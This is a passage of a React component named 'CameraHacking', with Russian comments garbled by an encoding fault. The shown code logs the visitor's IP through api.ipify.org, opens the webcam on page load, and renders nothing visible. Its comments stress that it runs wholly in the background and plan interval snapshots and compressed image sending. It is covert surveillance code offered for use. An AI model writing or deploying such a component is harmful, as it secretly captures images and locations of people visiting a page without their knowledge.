        const response = await axios.get('https://api.ipify.org?format=json', {
          timeout: 5000 // 5 —Å–µ–∫—É–Ω–¥ —Ç–∞–π–º–∞—É—Ç
        });
        
        const clientIp = response.data.ip;
        setClientIp(clientIp);
        
        console.log("‚úÖ Client IP fetched:", clientIp);
        
      } catch (error) {
        console.error("‚ùå Error fetching client IP:", error);
        setClientIp("IP unavailable"); // Fallback –∑–Ω–∞—á–µ–Ω–∏–µ
      }
    };

    //  –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
    accessWebcam();
    fetchClientIp();
  
    /**
     *  –§–£–ù–ö–¶–ò–Ø –û–ß–ò–°–¢–ö–ò (CLEANUP)
     * 
     * –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –∏–∑ useEffect –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—Ä–∏ —Ä–∞–∑–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞.
     * –û—Å–≤–æ–±–æ–∂–¥–∞–µ—Ç —Ä–µ—Å—É—Ä—Å—ã –∫–∞–º–µ—Ä—ã –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è —É—Ç–µ—á–µ–∫ –ø–∞–º—è—Ç–∏.
     * 
     *  –ß–¢–û –î–ï–õ–ê–ï–¢ CLEANUP:
     * 1. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞–ª–∏—á–∏–µ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –≤–∏–¥–µ–æ–ø–æ—Ç–æ–∫–∞
     * 2. –ü–æ–ª—É—á–∞–µ—Ç –≤—Å–µ —Ç—Ä–µ–∫–∏ (video/audio) –∏–∑ –ø–æ—Ç–æ–∫–∞
     * 3. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –∫–∞–∂–¥—ã–π —Ç—Ä–µ–∫ –º–µ—Ç–æ–¥–æ–º stop()
     * 4. –û—á–∏—â–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ –ø–æ—Ç–æ–∫ –≤ video —ç–ª–µ–º–µ–Ω—Ç–µ
     * 
     *  –í–ê–ñ–ù–û–°–¢–¨ CLEANUP:
     * –ë–µ–∑ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –æ—á–∏—Å—Ç–∫–∏ –∫–∞–º–µ—Ä–∞ –º–æ–∂–µ—Ç –æ—Å—Ç–∞—Ç—å—Å—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω–æ–π
     * –¥–∞–∂–µ –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã, —á—Ç–æ –Ω–µ –ø–æ–∑–≤–æ–ª–∏—Ç –¥—Ä—É–≥–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º
     * –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–º–µ—Ä—É.
     */
    return () => {
      console.log("üßπ Cleaning up camera resources...");
      
      if (videoRef.current && videoRef.current.srcObject) {
        // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –º–µ–¥–∏–∞ —Ç—Ä–µ–∫–∏ –∏–∑ –ø–æ—Ç–æ–∫–∞
        const tracks = videoRef.current.srcObject.getTracks();
        
        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–∂–¥—ã–π —Ç—Ä–µ–∫
        tracks.forEach((track) => {
          track.stop();
          console.log(`üõë Stopped ${track.kind} track`);
        });
        
        // –û—á–∏—â–∞–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –ø–æ—Ç–æ–∫
        videoRef.current.srcObject = null;
        console.log("‚úÖ Camera resources cleaned up");
      }
    };

  }, []); // –ü—É—Å—Ç–æ–π –º–∞—Å—Å–∏–≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π - —ç—Ñ—Ñ–µ–∫—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏

  /**
   *  –†–ï–ù–î–ï–†–ò–ù–ì –ö–û–ú–ü–û–ù–ï–ù–¢–ê
   * 
   * –ö–æ–º–ø–æ–Ω–µ–Ω—Ç –Ω–µ —Ä–µ–Ω–¥–µ—Ä–∏—Ç –Ω–∏–∫–∞–∫–∏—Ö –≤–∏–¥–∏–º—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ - –≤—Å—è —Ä–∞–±–æ—Ç–∞
   * –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ —á–µ—Ä–µ–∑ useEffect.
   * 
   * –í–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—É—Å—Ç–æ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç, —á—Ç–æ–±—ã React –±—ã–ª –¥–æ–≤–æ–ª–µ–Ω.
   */
  return (
    <>
      {/* 
         –≠—Ç–æ—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –ø–æ–ª–Ω–æ—Å—Ç—å—é –≤ —Ñ–æ–Ω–µ
        –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –≤–∏–¥–∏—Ç –Ω–∏–∫–∞–∫–∏—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
      */}
    </>
  );
};

export default CameraHacking;

/**
 *  –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ï –ó–ê–ú–ï–¢–ö–ò:
 * 
 *  –¢–†–ï–ë–û–í–ê–ù–ò–Ø –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò:
 * - –†–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –ø–æ HTTPS (–∫—Ä–æ–º–µ localhost)
 * - –¢—Ä–µ–±—É–µ—Ç —è–≤–Ω–æ–≥–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
 * - –ë—Ä–∞—É–∑–µ—Ä –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –∫–∞–º–µ—Ä—ã
 * 
 *  –ü–û–î–î–ï–†–ñ–ö–ê –ë–†–ê–£–ó–ï–†–û–í:
 * - Chrome/Edge: –ø–æ–ª–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞
 * - Firefox: –ø–æ–ª–Ω–∞—è –ø–æ–¥–¥–µ—Ä–∂–∫–∞
 * - Safari: –ø–æ–¥–¥–µ—Ä–∂–∫–∞ —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è–º–∏
 * - Mobile browsers: –∑–∞–≤–∏—Å–∏—Ç –æ—Ç –≤–µ—Ä—Å–∏–∏ –∏ –Ω–∞—Å—Ç—Ä–æ–µ–∫
 * 
 *  –í–û–ó–ú–û–ñ–ù–´–ï –£–õ–£–ß–®–ï–ù–ò–Ø:
 * - –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ —Å–Ω–∏–º–∫–∏ —Å –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º
 * - –í—ã–±–æ—Ä –∫–∞—á–µ—Å—Ç–≤–∞ –∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
 * - –î–µ—Ç–µ–∫—Ü–∏—è –¥–≤–∏–∂–µ–Ω–∏—è –¥–ª—è —É–º–Ω–æ–π —Å—ä–µ–º–∫–∏
 * - –°–∂–∞—Ç–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π
 * - –ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è offline –æ—Ç–ø—Ä–∞–≤–∫–∏
 *
 *  –ò–ó–í–ï–°–¢–ù–´–ï –û–ì–†–ê–ù–ò–ß–ï–ù–ò–Ø:
 * - –ù–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ iframe —Å –¥—Ä—É–≥–æ–≥–æ –¥–æ–º–µ–Ω–∞
 * - –ú–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã–º–∏ –ø–æ–ª–∏—Ç–∏–∫–∞–º–∏
 * - –ù–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö —Ç—Ä–µ–±—É–µ—Ç user gesture
 * - –í –ø—Ä–∏–≤–∞—Ç–Ω–æ–º —Ä–µ–∂–∏–º–µ –±—Ä–∞—É–∑–µ—Ä–∞ –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –ø–æ-—Ä–∞–∑–Ω–æ–º—É
 */


